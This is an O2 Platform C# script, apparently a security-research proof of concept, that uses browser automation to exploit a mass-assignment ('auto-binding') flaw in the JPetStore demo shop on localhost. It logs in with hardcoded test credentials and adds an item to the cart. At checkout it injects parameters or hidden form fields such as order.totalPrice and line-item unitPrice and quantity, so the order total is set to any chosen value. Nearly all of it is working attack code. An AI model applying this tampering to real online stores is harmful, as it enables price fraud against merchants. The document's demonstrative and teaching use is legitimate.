<?xml version="1.0"?>
<H2>
  <SourceCode>var topPanel = "JPetStore 'AutoBinding Vulnerability' PoC".popupWindow(1000,700).insert_LogViewer();
//var topPanel = panel.clear().add_Panel(); 

var actionPanel = topPanel.insert_Above(40);
var ie = topPanel.add_IE_with_NavigationBar().silent(true); 

var server = "http://127.0.0.1.:8080";

Action&lt;string,string&gt; login = 
	(username, password) =&gt; {
								ie.open(server + "/jpetstore/shop/signonForm.do");
								ie.field("username",username);
								ie.field("password",password);
								ie.buttons()[1].click();  
							};
							
Action loginPlaceAnOrderAndGoToCheckout = 
	()=&gt;{
			ie.open("http://127.0.0.1:8080/jpetstore");
			ie.link("Enter the Store").click();
			//login if needed
			var signOffLink = ie.links().where((link)=&gt; link.url().contains("signonForm.do")).first();
			if(signOffLink.notNull())
			{
				signOffLink.click();
				login("j2ee", "pwd1");
			}			
			ie.links().where((link)=&gt; link.url().contains("FISH"))[0].click();			
			ie.link("FI-FW-01 ").flash().click();			
			ie.links().where((link)=&gt; link.url().contains("addItemToCart"))[0].flash().click();			
			ie.links().where((link)=&gt; link.url().contains("checkout.do"))[0].flash().click();			
			ie.links().where((link)=&gt; link.url().contains("newOrder.do"))[0].flash().click(); 
		};
		
Action scrollToTotal =  
	()=&gt;{
			var tdElement = ie.elements().elements("TD").toList().Where((element)=&gt; element.innerHtml().notNull() &amp;&amp; element.innerHtml().contains("Total:")).first();
			tdElement.scrollIntoView();																								
			tdElement.injectHtml_beforeEnd("&lt;h2&gt;&lt;p align=right&gt;Look at the Total value from the table above (it should be 18.50)&lt;/p&gt;&lt;h2&gt;"); 			
		};
	
Action&lt;string&gt; exploit_Variation_1 = 
	(payload) =&gt; {
					loginPlaceAnOrderAndGoToCheckout();								
					ie.buttons()[1].flash().click();  
					ie.open(server + "/jpetstore/shop/newOrder.do?_finish=true&amp;" + payload); 
					scrollToTotal();
				 };

Action&lt;string&gt; exploit_Variation_1_SetTotalPrice = 
	(totalPrice) =&gt; { 
						var payload = "&amp;order.totalPrice={0}".format(totalPrice); 
						exploit_Variation_1(payload);
					};

Action&lt;string&gt; exploit_Variation_1_SetItemPriceQuantityAndTotalPrice = 
	(totalPrice) =&gt; { 
						var payload = "&amp;order.totalPrice={0}&amp;order.lineItems[0].unitPrice=12&amp;order.lineItems[0].quantity=12".format(totalPrice);
						exploit_Variation_1(payload);
					};
					

Action&lt;string&gt; exploit_Variation_2 = 
	(totalPrice) =&gt; {
						loginPlaceAnOrderAndGoToCheckout();		
						ie.field("order.billToFirstName").flash()
						  .injectHtml_afterEnd("&lt;br&gt;Total Price:&lt;input type=text name='order.totalPrice' value='{0}'/&gt;".format(totalPrice));
						ie.buttons()[1].flash().click();  
						ie.open("http://127.0.0.1.:8080/jpetstore/shop/newOrder.do?_finish=true");   						
						scrollToTotal();
					};					
					
//ie.disableFlashing();
var desiredPrice = "";
actionPanel.add_Label("Desired Total Price:").top(4)
		   .append_TextBox("").onTextChange((text) =&gt; desiredPrice = text).set_Text("1.99")		    
		   .append_CheckBox("Disable flashing",(value)=&gt; { if (value) ie.disableFlashing(); else ie.enableFlashing(); })  		   
		   .append_Link("Normal Request", ()=&gt; exploit_Variation_1("")).top(24).left(105)
		   .append_Link("Exploit Variation #1 (set TotalPrice) ", ()=&gt; exploit_Variation_1_SetTotalPrice(desiredPrice))
		   .append_Link("Exploit Variation #2 (set ItemPrice, Item Quantity and TotalPrice) ", ()=&gt; exploit_Variation_1_SetItemPriceQuantityAndTotalPrice(desiredPrice))
		   .append_Link("Exploit Variation #3 (set TotalPrice) ", ()=&gt; exploit_Variation_2(desiredPrice))
		   .append_Link("Exploit Variation #3 (set TotalPrice) ", ()=&gt; exploit_Variation_2(desiredPrice))
		   .append_Link("loginPlaceAnOrderAndGoToCheckout; ",()=&gt; loginPlaceAnOrderAndGoToCheckout());
		   
ie.open("http://127.0.0.1.:8080/jpetstore"); 		   

//actionPanel.link("Normal Request").click();
login("j2ee", "pwd1");
return "done";


//O2File:WatiN_IE_ExtensionMethods.cs
//O2Ref:WatiN.Core.1x.dll</SourceCode>
  <ReferencedAssemblies />
</H2>